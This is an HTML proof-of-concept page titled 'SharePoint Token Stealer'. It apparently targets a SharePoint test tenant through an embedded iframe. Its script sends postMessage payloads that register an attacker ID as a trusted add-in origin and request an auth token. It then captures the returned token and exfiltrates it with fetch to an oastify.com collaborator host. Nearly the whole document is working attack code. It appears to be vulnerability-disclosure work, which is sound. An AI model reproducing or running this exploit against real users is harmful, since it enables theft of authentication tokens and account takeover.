<!DOCTYPE html>
<html>
<head>
    <title>SharePoint PoC</title>
</head>
<body>
    <h1>SharePoint Token Stealer</h1>
    
    <!-- THE TARGET IFRAME -->
    <iframe id="sharepoint-frame" 
            src="https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&amp;action=embedview" 
            style="width:100%; height:500px;">
    </iframe>

    <script>
        // Malicious Page Script
        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
        const exploitId = "HACKER_ID";
        
        // Wait for iframe to load
        const iframe = document.getElementById("sharepoint-frame");
        
        iframe.onload = function() {
            const targetWindow = iframe.contentWindow;
            console.log("Iframe loaded, starting exploit...");

            // 1. Register Malicious Origin as Trusted
            const registerPayload = JSON.stringify({
                MessageId: "AddinTrustedOrigin",
                AddinTrustId: exploitId
            });
            targetWindow.postMessage(registerPayload, targetOrigin);
            console.log("Sent registration");

            // 2. Request Auth Token (after short delay)
            setTimeout(() => {
                const tokenPayload = {
                    MessageId: "GetAuthToken",
                    AddinTrustId: exploitId,
                    Resource: window.location.origin 
                };
                targetWindow.postMessage(tokenPayload, targetOrigin);
                console.log("Sent token request");
            }, 2000);
        };

        // 3. Capture & Exfiltrate Token
        window.addEventListener("message", (event) => {
            if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
                const token = event.data.Token;
                console.log("STOLEN TOKEN:", token);
                
                // EXFILTRATION
                fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                alert("Token stolen! Check console/collaborator.");
            }
        });
    </script>
</body>
</html>
